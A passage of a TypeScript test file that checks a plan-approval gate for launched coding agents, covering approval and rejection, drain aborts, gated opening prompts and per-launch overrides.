      expect(getPlanApproval(store.db, gate.id)).toMatchObject({ status: "awaiting_approval", plan: "v2" });
    } finally {
      store.db.close();
    }
  });

  test("waitForPlanApproval returns a decision that landed while the drain released it", async () => {
    const store = createStore(":memory:");
    try {
      const projectId = "p";
      upsertProject(store.db, { id: projectId, name: "P", branch: "main", repos: [] });
      const decide = [
        (id: string) => rejectPlan(store.db, id),
        (id: string) => approvePlan(store.db, id, {}),
      ];
      for (const [i, expected] of (["rejected", "approved"] as const).entries()) {
        const { gate } = gatedLaunch(store, projectId, `/w/${i}`);
        submitPlan(store.db, gate.id, { relevantFiles: [], plan: "p" });
        const drain = new AbortController();
        const waited = waitForPlanApproval(store.db, gate.id, 60, drain.signal);
        decide[i]!(gate.id);
        drain.abort();
        const resolution = await waited;
        expect(resolution.status).toBe(expected);
      }
    } finally {
      store.db.close();
    }
  });

  test("waitForPlanApproval throws DrainReleasedError when released with the plan still awaiting review", async () => {
    const store = createStore(":memory:");
    try {
      upsertProject(store.db, { id: "p", name: "P", branch: "main", repos: [] });
      const { gate } = gatedLaunch(store, "p", "/w");
      submitPlan(store.db, gate.id, { relevantFiles: [], plan: "p" });
      const drain = new AbortController();
      const waited = waitForPlanApproval(store.db, gate.id, 60, drain.signal);
      drain.abort();
      await expect(waited).rejects.toBeInstanceOf(DrainReleasedError);
      expect(getPlanApproval(store.db, gate.id)!.status).toBe("awaiting_approval");
    } finally {
      store.db.close();
    }
  });
});

describe("plan-gate prompt + resolution", () => {
  const project: Project = { id: "p", name: "P", branch: "main", repos: [] };

  test("buildOpeningPrompt injects the plan-first steering only when gated", () => {
    const store = createStore(":memory:");
    try {
      const gated = buildOpeningPrompt(store.db, "task", undefined, undefined, undefined, "", "", true);
      expect(gated).toContain("PLAN-GATED");
      expect(gated).toContain("submit_plan");

      const ungated = buildOpeningPrompt(store.db, "task", undefined, undefined, undefined, "", "", false);
      expect(ungated).not.toContain("PLAN-GATED");

      // A launch whose flags strip the standup MCP server can't reach submit_plan,
      // so the steering is dropped even when gated.
      const stripped = buildOpeningPrompt(
        store.db,
        "task",
        undefined,
        undefined,
        "--strict-mcp-config",
        "",
        "",
        true
      );
      expect(stripped).not.toContain("PLAN-GATED");
    } finally {
      store.db.close();
    }
  });

  test("resolvePlanGate: per-launch override wins over the project default", () => {
    expect(resolvePlanGate(project)).toBe(false);
    expect(resolvePlanGate({ ...project, planGate: true })).toBe(true);
    expect(resolvePlanGate({ ...project, planGate: true }, false)).toBe(false);
    expect(resolvePlanGate(project, true)).toBe(true);
  });
});
